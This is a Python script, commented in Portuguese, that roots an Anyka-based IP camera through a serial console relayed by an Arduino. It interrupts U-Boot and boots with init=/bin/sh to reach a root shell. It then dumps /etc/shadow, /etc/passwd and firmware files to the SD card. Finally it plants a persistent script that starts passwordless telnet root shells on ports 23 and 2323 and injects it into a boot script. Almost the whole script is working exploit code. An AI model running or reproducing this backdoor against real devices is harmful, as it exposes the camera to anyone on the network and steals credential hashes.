#!/usr/bin/env python3
"""
U-BOOT HACK v3 - Sem reset do Arduino!

PROBLEMA: Abrir a serial no CH340 manda DTR que RESETA o Arduino.
Arduino leva ~2s pra bootar = perde a janela de 1s do U-Boot.

SOLUCAO: Abre a porta com DTR=False pra nao resetar.
Tambem usa stty -hupcl como backup.

INSTRUCOES:
1. Roda o script (ele abre a serial sem resetar)
2. DESLIGA a camera da tomada
3. Espera 2 segundos
4. RELIGA a camera
5. O script pega o U-Boot!
"""
import serial
import time
import sys
import os
import subprocess

PORT = '/dev/ttyUSB0'
BAUD = 115200


def send_cmd(ser, cmd, wait=1.5):
    """Envia comando respeitando SoftwareSerial"""
    ser.reset_input_buffer()
    for ch in (cmd + '\r\n'):
        ser.write(ch.encode())
        time.sleep(0.003)
    time.sleep(wait)
    data = ser.read(16384)
    return data.decode('utf-8', errors='replace') if data else ''


def main():
    # Previne reset no HUP (fechar porta)
    try:
        subprocess.run(['stty', '-F', PORT, '-hupcl'], capture_output=True)
    except:
        pass

    # Abre SEM resetar o Arduino
    ser = serial.Serial()
    ser.port = PORT
    ser.baudrate = BAUD
    ser.timeout = 0.05
    ser.dtr = False   # NAO manda DTR = NAO reseta Arduino
    ser.rts = False   # Tambem desliga RTS
    ser.open()

    # Garante DTR baixo
    ser.dtr = False
    ser.rts = False

    # Limpa buffer velho
    ser.reset_input_buffer()
    time.sleep(0.1)
    ser.read(65536)  # descarta lixo
    ser.reset_input_buffer()

    print("=" * 60)
    print("  U-BOOT INTERCEPTOR v3 (sem reset Arduino)")
    print("  DTR=False, RTS=False")
    print("")
    print("  1. DESLIGA a camera da tomada")
    print("  2. Espera 2 segundos")
    print("  3. RELIGA a camera")
    print("=" * 60, flush=True)

    buf = b''
    start = time.time()
    uboot_caught = False
    uboot_seen = False
    hit_seen = False
    kernel_count = 0
    cycle = 0

    while time.time() - start < 120:
        cycle += 1

        # === LE por 25ms ===
        read_start = time.time()
        got_data = False
        while time.time() - read_start < 0.025:
            data = ser.read(512)
            if data:
                got_data = True
                buf += data
                text = data.decode('utf-8', errors='replace')
                for line in text.split('\n'):
                    l = line.strip()
                    if l and len(l) > 3:
                        # Mostra tudo que parece ser do boot (nao IPC)
                        if any(x in l for x in [
                            'U-Boot', 'Hit', 'DRAM', 'MiB', 'SF:', 'Boot',
                            'Start', 'ak39', '=>', 'anyka', 'UBOOT', 'DDR',
                            'Flash', 'mtd', 'Linux', 'kernel', 'init'
                        ]):
                            print(f'  {l[:120]}', flush=True)
            time.sleep(0.003)

        # === MANDA 1 espaco (ou burst se viu Hit) ===
        if hit_seen:
            # Burst agressivo de interrupt
            ser.write(b'\x20\r\n\x20\r\n\x20\r\n')
            time.sleep(0.005)
            ser.write(b'\x20\r\n\x20\r\n\x20\r\n')
        else:
            ser.write(b'\x20')  # 1 espaco

        # === DETECCAO ===
        tail = buf[-3000:] if len(buf) > 3000 else buf

        if b'U-Boot' in tail[-1000:] and not uboot_seen:
            uboot_seen = True
            print('>>> U-Boot detectado! Intensificando...', flush=True)
            # Manda burst imediato
            for _ in range(5):
                ser.write(b'\x20\r\n')
                time.sleep(0.003)

        if b'Hit any key' in tail[-500:] and not hit_seen:
            hit_seen = True
            print('>>> HIT ANY KEY! Mandando interrupts!', flush=True)
            # Burst MEGA agressivo
            for _ in range(20):
                ser.write(b'\x20\r\n')
                time.sleep(0.002)

        # Prompt U-Boot capturado?
        last = tail[-300:]
        if any(x in last for x in [b'anyka#', b'ak39', b'=> ']):
            # Pode ser falso positivo do "ak39ev330" no kernel
            # Verifica se eh realmente prompt
            time.sleep(0.3)
            ser.write(b'\r\n')
            time.sleep(0.8)
            extra = ser.read(4096)
            if extra:
                buf += extra
                etext = extra.decode('utf-8', errors='replace')
                for line in etext.split('\n'):
                    l = line.strip()
                    if l:
                        print(f'  >> {l[:120]}', flush=True)

            # Checa de novo
            check = buf[-500:]
            if any(x in check for x in [b'anyka#', b'=> ']):
                # Tenta "help" pra confirmar que eh U-Boot
                ser.write(b'help\r\n')
                time.sleep(1)
                help_data = ser.read(4096)
                if help_data:
                    htext = help_data.decode('utf-8', errors='replace')
                    if any(x in htext for x in ['base', 'boot', 'setenv', 'printenv', 'Unknown']):
                        print('\n>>> U-BOOT SHELL CAPTURADO! <<<', flush=True)
                        uboot_caught = True
                        break

        # Kernel = perdemos
        if b'Starting kernel' in tail[-500:]:
            kernel_count += 1
            elapsed = time.time() - start
            print(f'\n>>> KERNEL #{kernel_count} ({elapsed:.1f}s) - perdemos <<<', flush=True)
            if kernel_count < 3:
                print('Desliga/religa de novo! Script continua...', flush=True)
            buf = b''
            uboot_seen = False
            hit_seen = False

        # Status
        if cycle % 150 == 0:
            elapsed = time.time() - start
            print(f'  [{elapsed:.0f}s] {len(buf)} bytes, boot_seen={uboot_seen}', flush=True)

        time.sleep(0.015)

    if not uboot_caught:
        print(f"\nFalhou apos 120s. Detectou {kernel_count} boots.", flush=True)
        print("Dicas:", flush=True)
        print("  - Certifica que os fios da camera estao nos pinos 2/3 do Arduino", flush=True)
        print("  - Tenta desligar/religar a camera DEPOIS do script iniciar", flush=True)
        ser.close()
        return

    # ========================================
    # U-BOOT CAPTURADO!
    # ========================================
    time.sleep(0.5)
    ser.read(8192)

    print("\n" + "=" * 60)
    print("[U-BOOT] printenv...")
    print("=" * 60, flush=True)

    resp = send_cmd(ser, 'printenv', 3)
    print(resp, flush=True)

    # Modifica bootargs
    print("\n[U-BOOT] setenv bootargs init=/bin/sh", flush=True)
    new_bootargs = 'setenv bootargs console=ttySAK0,115200n8 root=/dev/mtdblock5 rootfstype=squashfs init=/bin/sh mem=64M'
    resp = send_cmd(ser, new_bootargs)
    print(f'  setenv: {resp}', flush=True)

    resp = send_cmd(ser, 'printenv bootargs')
    print(f'  Novo: {resp}', flush=True)
    print('  [!] Temporario - nao salvou no flash', flush=True)

    # Boot!
    print("\n[U-BOOT] boot...", flush=True)
    for ch in 'boot\r\n':
        ser.write(ch.encode())
        time.sleep(0.003)

    buf2 = b''
    start2 = time.time()
    shell_ready = False

    while time.time() - start2 < 30:
        data = ser.read(4096)
        if data:
            buf2 += data
            text = data.decode('utf-8', errors='replace')
            sys.stdout.write(text)
            sys.stdout.flush()

            if any(x in buf2[-200:] for x in [b'/ #', b'~ #', b'sh:', b'/ $']):
                print('\n\n>>> ROOT SHELL PURO! <<<', flush=True)
                shell_ready = True
                break
        time.sleep(0.02)

    if not shell_ready:
        for _ in range(3):
            ser.write(b'\r\n')
            time.sleep(1)
            data = ser.read(4096)
            if data:
                text = data.decode('utf-8', errors='replace')
                print(text, end='', flush=True)
                if '#' in text:
                    shell_ready = True
                    print('\n>>> SHELL DETECTADO! <<<', flush=True)
                    break

    # ========================================
    # HACK
    # ========================================
    print("\n" + "=" * 60)
    print("[SHELL] Montando filesystems e hackeando!")
    print("=" * 60, flush=True)

    setup_cmds = [
        ("proc",   "mount -t proc proc /proc"),
        ("sys",    "mount -t sysfs sys /sys"),
        ("devpts", "mkdir -p /dev/pts && mount -t devpts devpts /dev/pts"),
        ("jffs2",  "mount -t jffs2 /dev/mtdblock6 /rom 2>/dev/null"),
        ("tmpfs",  "mount -t tmpfs tmpfs /tmp"),
        ("SD",     "mkdir -p /mnt/disc1 && mount /dev/mmcblk0p1 /mnt/disc1 2>/dev/null || mount /dev/mmcblk0 /mnt/disc1 2>/dev/null"),
    ]

    for desc, cmd in setup_cmds:
        resp = send_cmd(ser, cmd, 2)
        print(f'  [{desc}] ok', flush=True)

    SD = '/mnt/disc1'

    # Dumps
    print("\n[DUMPS]", flush=True)
    dumps = [
        f"id > {SD}/id.txt",
        f"cp /etc/passwd {SD}/passwd.txt 2>/dev/null",
        f"cp /etc/shadow {SD}/shadow.txt 2>/dev/null",
        f"cat /etc/inittab > {SD}/inittab.txt 2>/dev/null",
        f"cat /etc/init.d/rc.local > {SD}/rc_local.txt 2>/dev/null",
        f"cat /etc/init.d/rcS > {SD}/rcS.txt 2>/dev/null",
        f"cat /ipc/setup.sh > {SD}/setup.txt 2>/dev/null",
        f"mount > {SD}/mount.txt",
        f"cat /proc/mtd > {SD}/mtd.txt",
        f"cat /proc/cpuinfo > {SD}/cpuinfo.txt",
        f"cat /proc/cmdline > {SD}/cmdline.txt",
        f"dmesg > {SD}/dmesg.txt 2>/dev/null",
        f"ls -laR /rom/ > {SD}/rom_list.txt 2>/dev/null",
        f"ls -laR /etc/ > {SD}/etc_list.txt 2>/dev/null",
        f"ifconfig > {SD}/ifconfig.txt 2>/dev/null",
    ]
    for cmd in dumps:
        resp = send_cmd(ser, cmd, 2)
        name = cmd.split('/')[-1].split(' ')[0]
        print(f'  {name}', flush=True)

    send_cmd(ser, f"for f in /rom/*; do echo ====$f; cat $f 2>/dev/null; done > {SD}/rom_all.txt", 5)
    send_cmd(ser, f"for f in /etc/init.d/*; do echo ====$f; cat $f; done > {SD}/initd_all.txt", 5)
    print('  rom_all + initd_all', flush=True)

    # Hack persistente
    print("\n[HACK PERSISTENTE]", flush=True)
    send_cmd(ser, "echo '#!/bin/sh' > /rom/hack.sh", 1)
    send_cmd(ser, "echo '(while true;do echo V>/dev/watchdog 2>/dev/null;sleep 1;done)&' >> /rom/hack.sh", 1)
    send_cmd(ser, "echo 'telnetd -l /bin/sh &' >> /rom/hack.sh", 1)
    send_cmd(ser, "echo 'telnetd -l /bin/sh -p 2323 &' >> /rom/hack.sh", 1)
    send_cmd(ser, "chmod +x /rom/hack.sh", 1)
    print('  hack.sh criado', flush=True)

    send_cmd(ser, "grep -q hack /rom/time_zone.sh 2>/dev/null || echo '/rom/hack.sh &' >> /rom/time_zone.sh", 2)
    print('  time_zone.sh injetado', flush=True)

    resp = send_cmd(ser, "cat /rom/hack.sh", 2)
    print(f'\nhack.sh:\n{resp}', flush=True)

    resp = send_cmd(ser, "cat /rom/time_zone.sh 2>/dev/null", 2)
    print(f'time_zone.sh:\n{resp}', flush=True)

    send_cmd(ser, f"echo HACK_COMPLETE > {SD}/SUCCESS.txt", 1)

    print("\n" + "=" * 60)
    print("  HACK COMPLETO!")
    print("  Dumps: SD card")
    print("  Persist: /rom/hack.sh (telnet + watchdog)")
    print("  Reboot normal: desliga/religa")
    print("=" * 60)

    # Interativo
    print("\nModo interativo (Ctrl+C sair)...", flush=True)
    try:
        while True:
            cmd = input("cam# ")
            if cmd.strip():
                resp = send_cmd(ser, cmd, 2)
                print(resp)
    except (KeyboardInterrupt, EOFError):
        pass

    ser.close()


if __name__ == '__main__':
    main()
